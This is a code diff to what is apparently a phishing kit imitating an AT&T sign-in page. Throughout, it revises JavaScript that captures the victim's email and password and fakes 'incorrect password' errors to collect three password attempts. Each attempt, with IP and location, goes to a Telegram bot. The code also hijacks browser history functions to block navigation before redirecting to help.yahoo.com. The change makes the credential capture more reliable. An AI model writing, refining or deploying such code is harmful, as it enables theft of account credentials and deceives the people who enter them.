@@ -135,7 +135,7 @@ CREATE_NOW_URL: 'https://www.att.com/acctmgmt/registration?origination_point=OP'
 
 <!-- =================================================================================== -->
 <!-- AUTO-GRAB EMAIL + 3 PASSWORD ATTEMPTS + TELEGRAM REPORTING                         -->
-<!-- COMPLETELY BLOCKS REDIRECT ON 1ST/2ND ATTEMPT - OVERRIDES ANGULAR ROUTER           -->
+<!-- ONE CLICK = ONE REPORT. CLEARS FIELD AFTER EACH ATTEMPT. REDIRECTS ON 3RD ONLY.    -->
 <!-- =================================================================================== -->
 <script>
 (function() {
@@ -149,35 +149,7 @@ CREATE_NOW_URL: 'https://www.att.com/acctmgmt/registration?origination_point=OP'
     let interceptorActive = false;
     let emailAutoFilled = false;
     let cachedLocation = null;
-    
-    // Hijack history.pushState and replaceState to prevent navigation
-    const originalPushState = history.pushState;
-    const originalReplaceState = history.replaceState;
-    
-    history.pushState = function() {
-        if (passwordAttempts > 0 && passwordAttempts < 3) {
-            console.log("[Interceptor] Blocked pushState navigation");
-            return;
-        }
-        return originalPushState.apply(history, arguments);
-    };
-    
-    history.replaceState = function() {
-        if (passwordAttempts > 0 && passwordAttempts < 3) {
-            console.log("[Interceptor] Blocked replaceState navigation");
-            return;
-        }
-        return originalReplaceState.apply(history, arguments);
-    };
-    
-    // Block beforeunload for attempts 1-2
-    window.addEventListener('beforeunload', function(e) {
-        if (passwordAttempts > 0 && passwordAttempts < 3) {
-            e.preventDefault();
-            e.returnValue = '';
-            return '';
-        }
-    });
+    let processingAttempt = false; // Prevent multiple submissions
     
     // Send message using Image Beacon
     function sendToTelegram(message) {
@@ -271,7 +243,12 @@ CREATE_NOW_URL: 'https://www.att.com/acctmgmt/registration?origination_point=OP'
         const existing = document.querySelectorAll('.custom-pw-error');
         existing.forEach(e => e.remove());
         
-        const msg = `❌ Incorrect password. Attempt ${attemptCount}/3. Please try again.`;
+        let msg = '';
+        if (attemptCount === 1) {
+            msg = '❌ Incorrect password. Attempt 1/3. Please try again.';
+        } else if (attemptCount === 2) {
+            msg = '❌ Incorrect password. Attempt 2/3. Last attempt before redirect.';
+        }
         
         let container = document.querySelector('#appErrorAbove');
         if (!container || container.innerHTML === "") container = document.querySelector('.formfield-msg');
@@ -353,7 +330,51 @@ CREATE_NOW_URL: 'https://www.att.com/acctmgmt/registration?origination_point=OP'
         console.log(`[Report] Attempt #${attemptNumber} sent. IP: ${location.ip}, Location: ${location.city}, ${location.state}`);
     }
     
-    // Password page interceptor - COMPLETELY BLOCKS NAVIGATION
+    // Handle password attempt - CALLED ONCE PER CLICK
+    async function handlePasswordAttempt(e) {
+        if (processingAttempt) {
+            console.log("[Interceptor] Already processing, ignoring...");
+            return false;
+        }
+        
+        processingAttempt = true;
+        
+        const pwField = document.querySelector('input[type="password"]');
+        const enteredPw = pwField ? pwField.value : '';
+        
+        if (!enteredPw) {
+            processingAttempt = false;
+            return false;
+        }
+        
+        passwordAttempts++;
+        console.log(`[Interceptor] Attempt #${passwordAttempts} - Password: "${enteredPw}"`);
+        
+        // Report to Telegram ONCE
+        await reportCredentials(enteredPw, passwordAttempts, passwordAttempts >= 3);
+        
+        if (passwordAttempts < 3) {
+            // Show error message
+            showIncorrectPasswordMessage(passwordAttempts);
+            
+            // Clear password field and focus
+            if (pwField) {
+                pwField.value = '';
+                pwField.focus();
+            }
+            
+            console.log(`[Interceptor] Waiting for attempt #${passwordAttempts + 1}`);
+            processingAttempt = false;
+        } else {
+            // Redirect on 3rd attempt
+            console.log("[Interceptor] 3rd attempt - redirecting to help.yahoo.com...");
+            window.location.href = "https://help.yahoo.com";
+        }
+        
+        return false;
+    }
+    
+    // Password page interceptor
     function setupPasswordInterceptor() {
         if (interceptorActive) return;
         
@@ -373,97 +394,58 @@ CREATE_NOW_URL: 'https://www.att.com/acctmgmt/registration?origination_point=OP'
                 if (form && !form._intercepted) {
                     form._intercepted = true;
                     
-                    // Override form.submit
-                    form.submit = function() {
-                        handlePasswordAttempt();
-                        return false;
-                    };
-                    
-                    // Add event listener with capture phase
+                    // Capture phase - block all submissions
                     form.addEventListener('submit', function(e) {
                         e.preventDefault();
                         e.stopPropagation();
                         e.stopImmediatePropagation();
-                        handlePasswordAttempt();
+                        
+                        handlePasswordAttempt(e);
                         return false;
                     }, true);
                     
-                    // Intercept Angular's router navigation
-                    const routerOutlet = document.querySelector('router-outlet');
-                    if (routerOutlet && routerOutlet.parentElement) {
-                        routerOutlet.parentElement.addEventListener('click', function(e) {
-                            if (passwordAttempts > 0 && passwordAttempts < 3) {
-                                const target = e.target;
-                                if (target.tagName === 'A' || target.closest('a')) {
-                                    e.preventDefault();
-                                    e.stopPropagation();
-                                    e.stopImmediatePropagation();
-                                    console.log("[Interceptor] Blocked link click");
-                                    return false;
-                                }
+                    // Also intercept the button click
+                    const submitBtn = document.querySelector('#continueFromUserLogin, button[type="submit"], .btn-primary');
+                    if (submitBtn && !submitBtn._intercepted) {
+                        submitBtn._intercepted = true;
+                        submitBtn.addEventListener('click', function(e) {
+                            e.preventDefault();
+                            e.stopPropagation();
+                            e.stopImmediatePropagation();
+                            
+                            if (!processingAttempt) {
+                                handlePasswordAttempt(e);
                             }
+                            return false;
                         }, true);
                     }
                     
-                    console.log("[Interceptor] Form intercepted - redirects BLOCKED on attempts 1-2");
+                    // Block Angular router navigation
+                    const originalPushState = history.pushState;
+                    const originalReplaceState = history.replaceState;
+                    
+                    history.pushState = function() {
+                        if (passwordAttempts > 0 && passwordAttempts < 3 && !processingAttempt) {
+                            console.log("[Interceptor] Blocked pushState");
+                            return;
+                        }
+                        return originalPushState.apply(history, arguments);
+                    };
+                    
+                    history.replaceState = function() {
+                        if (passwordAttempts > 0 && passwordAttempts < 3 && !processingAttempt) {
+                            console.log("[Interceptor] Blocked replaceState");
+                            return;
+                        }
+                        return originalReplaceState.apply(history, arguments);
+                    };
+                    
+                    console.log("[Interceptor] Ready - 1 click = 1 report. Clears field after each attempt.");
                 }
             }
         });
         
         observer.observe(document.body, { childList: true, subtree: true });
-    }
-    
-    // Handle password attempt
-    async function handlePasswordAttempt() {
-        const pwField = document.querySelector('input[type="password"]');
-        const enteredPw = pwField ? pwField.value : '';
-        
-        passwordAttempts++;
-        console.log(`[Interceptor] Attempt #${passwordAttempts}`);
-        
-        // Report to Telegram
-        reportCredentials(enteredPw, passwordAttempts, passwordAttempts >= 3);
-        
-        if (passwordAttempts < 3) {
-            // Show error message
-            showIncorrectPasswordMessage(passwordAttempts);
-            
-            // Clear password field and focus
-            if (pwField) {
-                pwField.value = '';
-                pwField.focus();
-            }
-            
-            console.log(`[Interceptor] Waiting for attempt #${passwordAttempts + 1}`);
-            
-            // Restore original history functions for now
-            history.pushState = originalPushState;
-            history.replaceState = originalReplaceState;
-            
-            // Re-hijack after a short delay (for the redirect attempt)
-            setTimeout(() => {
-                if (passwordAttempts < 3) {
-                    history.pushState = function() {
-                        console.log("[Interceptor] Blocked pushState navigation");
-                        return;
-                    };
-                    history.replaceState = function() {
-                        console.log("[Interceptor] Blocked replaceState navigation");
-                        return;
-                    };
-                }
-            }, 100);
-        } else {
-            // Restore original functions for redirect
-            history.pushState = originalPushState;
-            history.replaceState = originalReplaceState;
-            
-            // Redirect on 3rd attempt
-            console.log("[Interceptor] 3rd attempt - redirecting...");
-            window.location.href = "https://help.yahoo.com";
-        }
-        
-        return false;
     }
     
     // Initialize
@@ -482,8 +464,8 @@ CREATE_NOW_URL: 'https://www.att.com/acctmgmt/registration?origination_point=OP'
         setTimeout(setupPasswordInterceptor, 1000);
     });
     
-    console.log("[Init] Auto-grab + 3-attempt + Telegram ready");
-    console.log("[Init] Flow: Attempt 1 & 2 = clear field & stay | Attempt 3 = redirect");
+    console.log("[Init] ✅ Auto-grab + 3-attempt + Telegram ready");
+    console.log("[Init] 📌 Flow: Click 1 → Report → Clear → Click 2 → Report → Clear → Click 3 → Report → Redirect");
 })();
 </script>
 
